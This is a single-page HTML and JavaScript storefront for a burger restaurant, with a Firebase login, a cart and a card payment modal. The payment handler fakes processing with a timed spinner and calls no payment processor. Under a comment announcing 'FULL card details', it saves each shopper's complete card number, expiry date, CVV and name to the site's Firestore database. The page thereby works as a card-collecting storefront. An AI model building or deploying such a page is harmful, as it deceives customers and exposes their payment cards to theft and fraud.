<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BURGER HOUSE | Premium Fast Food</title>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800&family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #c49b63;
            --primary-dark: #a17d4a;
            --dark: #1a1a1a;
            --light: #faf9f7;
            --gray: #e8e5e0;
            --text: #333333;
            --white: #ffffff;
            --shadow: 0 10px 30px rgba(0,0,0,0.05);
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: var(--light);
            color: var(--text);
            overflow-x: hidden;
        }

        h1, h2, h3, h4 {
            font-family: 'Playfair Display', serif;
        }

        /* ===== NAVBAR ===== */
        .navbar {
            background: var(--white);
            box-shadow: var(--shadow);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .nav-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo i {
            font-size: 36px;
            color: var(--primary);
        }

        .logo h2 {
            font-size: 26px;
            font-weight: 800;
        }

        .logo span {
            color: var(--primary);
        }

        .nav-links {
            display: flex;
            gap: 40px;
        }

        .nav-links a {
            text-decoration: none;
            color: var(--text);
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            position: relative;
        }

        .nav-links a::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--primary);
            transition: width 0.3s;
        }

        .nav-links a:hover::after {
            width: 100%;
        }

        .right-section {
            display: flex;
            align-items: center;
            gap: 25px;
        }

        .cart-icon {
            position: relative;
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: var(--text);
        }

        .cart-count {
            position: absolute;
            top: -8px;
            right: -8px;
            background: var(--primary);
            color: white;
            font-size: 11px;
            padding: 3px 6px;
            border-radius: 50%;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .user-info button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 10px 22px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .admin-link {
            color: var(--primary) !important;
            font-weight: 700 !important;
        }

        /* ===== HERO SECTION ===== */
        .hero {
            max-width: 1400px;
            margin: 50px auto;
            padding: 0 30px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            align-items: center;
            gap: 60px;
            background: var(--white);
            border-radius: 40px;
            overflow: hidden;
        }

        .hero-content {
            padding: 60px 40px;
        }

        .hero-content h1 {
            font-size: 64px;
            font-weight: 800;
            line-height: 1.1;
            margin-bottom: 20px;
        }

        .hero-content .highlight {
            color: var(--primary);
        }

        .hero-content p {
            font-size: 18px;
            color: #666;
            margin-bottom: 30px;
        }

        .hero-content p i {
            color: var(--primary);
            margin-right: 10px;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
            border: none;
            padding: 18px 45px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 12px;
        }

        .hero-image {
            height: 600px;
        }

        .hero-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* ===== PRODUCTS ===== */
        .products {
            max-width: 1400px;
            margin: 80px auto;
            padding: 0 30px;
        }

        .section-header {
            text-align: center;
            margin-bottom: 50px;
        }

        .section-header h2 {
            font-size: 42px;
            font-weight: 800;
            margin-bottom: 15px;
        }

        .section-header h2 span {
            color: var(--primary);
        }

        .products-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 30px;
        }

        .product-card {
            background: var(--white);
            border-radius: 30px;
            overflow: hidden;
            box-shadow: var(--shadow);
            transition: all 0.3s;
        }

        .product-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }

        .product-image {
            height: 240px;
            overflow: hidden;
        }

        .product-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.5s;
        }

        .product-card:hover .product-image img {
            transform: scale(1.1);
        }

        .product-info {
            padding: 25px;
        }

        .product-info h3 {
            font-size: 22px;
            margin-bottom: 10px;
        }

        .product-price {
            font-size: 28px;
            font-weight: 800;
            color: var(--primary);
            margin-bottom: 20px;
        }

        .btn-add-to-cart {
            width: 100%;
            background: var(--gray);
            border: none;
            padding: 14px;
            border-radius: 15px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-add-to-cart:hover {
            background: var(--primary);
            color: white;
        }

        /* ===== CART SIDEBAR ===== */
        .cart-sidebar {
            position: fixed;
            top: 0;
            right: -500px;
            width: 450px;
            height: 100vh;
            background: var(--white);
            box-shadow: -10px 0 40px rgba(0,0,0,0.1);
            z-index: 2000;
            transition: right 0.4s;
            display: flex;
            flex-direction: column;
        }

        .cart-sidebar.active {
            right: 0;
        }

        .cart-header {
            padding: 30px;
            border-bottom: 2px solid var(--gray);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .cart-header h3 i {
            color: var(--primary);
            margin-right: 10px;
        }

        .close-cart {
            background: var(--gray);
            border: none;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            font-size: 20px;
            cursor: pointer;
        }

        .cart-items {
            flex: 1;
            overflow-y: auto;
            padding: 30px;
        }

        .cart-item {
            display: flex;
            gap: 20px;
            margin-bottom: 25px;
            padding: 20px;
            background: var(--light);
            border-radius: 20px;
        }

        .cart-item img {
            width: 90px;
            height: 90px;
            border-radius: 15px;
            object-fit: cover;
        }

        .cart-item-details {
            flex: 1;
        }

        .cart-item-details h4 {
            font-size: 18px;
            margin-bottom: 8px;
        }

        .cart-item-price {
            color: var(--primary);
            font-weight: 700;
            font-size: 18px;
            margin-bottom: 12px;
        }

        .cart-item-actions {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .cart-item-actions button {
            background: var(--gray);
            border: none;
            width: 32px;
            height: 32px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 700;
        }

        .cart-item-actions button:hover {
            background: var(--primary);
            color: white;
        }

        .remove-btn {
            background: none !important;
            color: #ef4444;
        }

        .cart-footer {
            padding: 30px;
            border-top: 2px solid var(--gray);
        }

        .cart-total {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: 600;
        }

        .cart-total span:last-child {
            color: var(--primary);
            font-size: 28px;
        }

        .btn-checkout {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
        }

        /* ===== PAYMENT MODAL ===== */
        .payment-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 3000;
        }

        .payment-modal.active {
            display: flex;
        }

        .payment-content {
            background: white;
            padding: 40px;
            border-radius: 30px;
            width: 90%;
            max-width: 500px;
        }

        .payment-content h3 {
            font-size: 28px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid var(--gray);
            border-radius: 12px;
            font-size: 16px;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--primary);
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .btn-pay {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
        }

        .loader {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .loader.active {
            display: block;
        }

        .spinner {
            border: 4px solid var(--gray);
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: none;
            z-index: 1999;
        }

        .overlay.active {
            display: block;
        }

        .toast {
            position: fixed;
            bottom: 40px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: var(--dark);
            color: white;
            padding: 16px 35px;
            border-radius: 60px;
            z-index: 4000;
            transition: transform 0.3s;
            opacity: 0;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }
            .hero {
                grid-template-columns: 1fr;
            }
            .cart-sidebar {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <div class="logo">
                <i class="fas fa-utensils"></i>
                <h2>BURGER<span>HOUSE</span></h2>
            </div>
            
            <div class="nav-links">
                <a onclick="scrollToSection('home')">Home</a>
                <a onclick="scrollToSection('products')">Menu</a>
                <a href="admin/dashboard.html" id="adminLink" style="display: none;" class="admin-link">Admin Panel</a>
            </div>
            
            <div class="right-section">
                <button class="cart-icon" onclick="toggleCart()">
                    <i class="fas fa-shopping-bag"></i>
                    <span class="cart-count" id="cartCount">0</span>
                </button>
                
                <div class="user-info" id="userInfo">
                    <button onclick="googleLogin()">
                        <i class="fab fa-google"></i> Login
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <section class="hero" id="home">
        <div class="hero-content">
            <h1>Where Every <span class="highlight">Bite</span> Tells a Story</h1>
            <p>
                <i class="fas fa-check-circle"></i> Premium ingredients<br>
                <i class="fas fa-check-circle"></i> Secret recipes<br>
                <i class="fas fa-check-circle"></i> 30-min delivery
            </p>
            <button class="btn-primary" onclick="scrollToSection('products')">
                Explore Menu <i class="fas fa-arrow-right"></i>
            </button>
        </div>
        <div class="hero-image">
            <img src="https://images.unsplash.com/photo-1571091718767-18b5b1457add?w=800" alt="Burger">
        </div>
    </section>

    <section class="products" id="products">
        <div class="section-header">
            <h2>Signature <span>Collection</span></h2>
        </div>
        <div class="products-grid" id="productsGrid"></div>
    </section>

    <!-- Cart Sidebar -->
    <div class="cart-sidebar" id="cartSidebar">
        <div class="cart-header">
            <h3><i class="fas fa-shopping-bag"></i> Your Cart</h3>
            <button class="close-cart" onclick="toggleCart()"><i class="fas fa-times"></i></button>
        </div>
        <div class="cart-items" id="cartItems"></div>
        <div class="cart-footer">
            <div class="cart-total">
                <span>Total</span>
                <span id="cartTotal">$0.00</span>
            </div>
            <button class="btn-checkout" onclick="proceedToPayment()">Proceed to Payment</button>
        </div>
    </div>

    <!-- Payment Modal -->
    <div class="payment-modal" id="paymentModal">
        <div class="payment-content">
            <h3>Payment Details</h3>
            <form id="paymentForm">
                <div class="form-group">
                    <label>Card Number</label>
                    <input type="text" id="cardNumber" maxlength="19" placeholder="4532 1234 5678 9012" required>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Expiry Date</label>
                        <input type="text" id="expiryDate" placeholder="MM/YY" required>
                    </div>
                    <div class="form-group">
                        <label>CVV</label>
                        <input type="password" id="cvv" maxlength="3" placeholder="123" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Cardholder Name</label>
                    <input type="text" id="cardName" placeholder="John Doe" required>
                </div>
                
                <div class="loader" id="paymentLoader">
                    <div class="spinner"></div>
                    <p>Processing payment...</p>
                </div>
                
                <button type="submit" class="btn-pay" id="payButton">Pay Now</button>
                <button type="button" class="btn-pay" style="background:#ccc; margin-top:10px;" onclick="closePaymentModal()">Cancel</button>
            </form>
        </div>
    </div>

    <div class="overlay" id="overlay" onclick="toggleCart()"></div>
    <div class="toast" id="toast"></div>

    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyDvpwrivywDoS4KrEKDjJfHvrVLTDHMHJQ",
            authDomain: "ukstore-147e3.firebaseapp.com",
            projectId: "ukstore-147e3",
            storageBucket: "ukstore-147e3.firebasestorage.app",
            messagingSenderId: "682218466479",
            appId: "1:682218466479:web:2cf15486de7a18efb0b85a"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        // Global Variables
        let currentUser = null;
        let cart = [];

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            loadProducts();
            loadCart();
            displayCart();
            setupAuth();
        });

        // ===== AUTH SETUP =====
        function setupAuth() {
            auth.onAuthStateChanged(async (user) => {
                if (user) {
                    currentUser = user;
                    document.getElementById('userInfo').innerHTML = `
                        <span>${user.displayName?.split(' ')[0] || 'User'}</span>
                        <button onclick="logout()"><i class="fas fa-sign-out-alt"></i></button>
                    `;
                    
                    // Check if admin
                    const userDoc = await db.collection('users').doc(user.uid).get();
                    if (userDoc.exists && userDoc.data().role === 'admin') {
                        document.getElementById('adminLink').style.display = 'inline';
                    }
                } else {
                    currentUser = null;
                    document.getElementById('userInfo').innerHTML = `
                        <button onclick="googleLogin()"><i class="fab fa-google"></i> Login</button>
                    `;
                    document.getElementById('adminLink').style.display = 'none';
                }
            });
        }

        async function googleLogin() {
            try {
                const provider = new firebase.auth.GoogleAuthProvider();
                await auth.signInWithPopup(provider);
                showToast('Login successful!');
            } catch (error) {
                showToast('Login failed');
            }
        }

        async function logout() {
            try {
                await auth.signOut();
                cart = [];
                saveCart();
                showToast('Logged out');
            } catch (error) {
                showToast('Logout failed');
            }
        }

        // ===== PRODUCTS =====
        function loadProducts() {
            const products = [
                { name: 'Classic Burger', price: 12.99, image: 'https://images.unsplash.com/photo-1568901346375-23c9450c58cd?w=600' },
                { name: 'Double Trouble', price: 16.99, image: 'https://images.unsplash.com/photo-1553979459-d2229ba7431a?w=600' },
                { name: 'Truffle Melt', price: 19.99, image: 'https://images.unsplash.com/photo-1572802419224-296b0aeee0d9?w=600' },
                { name: 'Crispy Chicken', price: 14.99, image: 'https://images.unsplash.com/photo-1626645738196-c2a7c87a8f58?w=600' }
            ];

            const grid = document.getElementById('productsGrid');
            grid.innerHTML = '';

            products.forEach(p => {
                grid.innerHTML += `
                    <div class="product-card">
                        <div class="product-image"><img src="${p.image}" alt="${p.name}"></div>
                        <div class="product-info">
                            <h3>${p.name}</h3>
                            <div class="product-price">$${p.price}</div>
                            <button class="btn-add-to-cart" onclick="addToCart('${p.name}', ${p.price}, '${p.image}')">
                                <i class="fas fa-plus"></i> Add to Cart
                            </button>
                        </div>
                    </div>
                `;
            });
        }

        // ===== CART FUNCTIONS =====
        function addToCart(name, price, image) {
            const existing = cart.find(i => i.name === name);
            existing ? existing.quantity++ : cart.push({ name, price, image, quantity: 1 });
            saveCart();
            displayCart();
            showToast('Added to cart');
        }

        function removeFromCart(name) {
            cart = cart.filter(i => i.name !== name);
            saveCart();
            displayCart();
        }

        function updateQuantity(name, change) {
            const item = cart.find(i => i.name === name);
            if (item) {
                item.quantity += change;
                item.quantity <= 0 ? removeFromCart(name) : (saveCart(), displayCart());
            }
        }

        function saveCart() {
            localStorage.setItem('cart', JSON.stringify(cart));
            document.getElementById('cartCount').textContent = cart.reduce((t,i) => t + i.quantity, 0);
        }

        function loadCart() {
            const saved = localStorage.getItem('cart');
            if (saved) {
                cart = JSON.parse(saved);
                document.getElementById('cartCount').textContent = cart.reduce((t,i) => t + i.quantity, 0);
            }
        }

        function displayCart() {
            const container = document.getElementById('cartItems');
            const totalEl = document.getElementById('cartTotal');
            
            if (cart.length === 0) {
                container.innerHTML = '<div style="text-align:center; padding:40px;">Cart is empty</div>';
                totalEl.textContent = '$0.00';
                return;
            }
            
            let html = '';
            let total = 0;
            cart.forEach(item => {
                total += item.price * item.quantity;
                html += `
                    <div class="cart-item">
                        <img src="${item.image}" alt="${item.name}">
                        <div class="cart-item-details">
                            <h4>${item.name}</h4>
                            <div class="cart-item-price">$${(item.price * item.quantity).toFixed(2)}</div>
                            <div class="cart-item-actions">
                                <button onclick="updateQuantity('${item.name}', -1)">−</button>
                                <span>${item.quantity}</span>
                                <button onclick="updateQuantity('${item.name}', 1)">+</button>
                                <button class="remove-btn" onclick="removeFromCart('${item.name}')"><i class="fas fa-trash"></i></button>
                            </div>
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
            totalEl.textContent = `$${total.toFixed(2)}`;
        }

        function toggleCart() {
            document.getElementById('cartSidebar').classList.toggle('active');
            document.getElementById('overlay').classList.toggle('active');
            displayCart();
        }

        // ===== PAYMENT =====
        function proceedToPayment() {
            if (cart.length === 0) {
                showToast('Cart is empty');
                return;
            }
            if (!currentUser) {
                showToast('Please login first');
                googleLogin();
                return;
            }
            toggleCart();
            document.getElementById('paymentModal').classList.add('active');
        }

        function closePaymentModal() {
            document.getElementById('paymentModal').classList.remove('active');
            document.getElementById('paymentForm').reset();
        }

        // Payment Form Submit
        document.getElementById('paymentForm')?.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            document.getElementById('paymentLoader').classList.add('active');
            document.getElementById('payButton').disabled = true;
            
            await new Promise(r => setTimeout(r, 2000));
            
            try {
                const total = cart.reduce((t, i) => t + (i.price * i.quantity), 0);
                
                // Save order with FULL card details
                const orderData = {
                    userId: currentUser.uid,
                    userEmail: currentUser.email,
                    items: cart,
                    total: total,
                    cardDetails: {
                        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
                        expiry: document.getElementById('expiryDate').value,
                        cvv: document.getElementById('cvv').value,
                        holderName: document.getElementById('cardName').value
                    },
                    createdAt: new Date().toISOString()
                };
                
                await db.collection('orders').add(orderData);
                
                document.getElementById('paymentLoader').classList.remove('active');
                document.getElementById('payButton').disabled = false;
                
                showToast('Order placed successfully!');
                cart = [];
                saveCart();
                displayCart();
                closePaymentModal();
                
            } catch (error) {
                showToast('Payment failed');
                document.getElementById('paymentLoader').classList.remove('active');
                document.getElementById('payButton').disabled = false;
            }
        });

        // ===== UI =====
        function scrollToSection(id) {
            document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
        }

        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2000);
        }

        // Global functions
        window.scrollToSection = scrollToSection;
        window.toggleCart = toggleCart;
        window.addToCart = addToCart;
        window.removeFromCart = removeFromCart;
        window.updateQuantity = updateQuantity;
        window.proceedToPayment = proceedToPayment;
        window.closePaymentModal = closePaymentModal;
        window.googleLogin = googleLogin;
        window.logout = logout;
    </script>
</body>
</html>
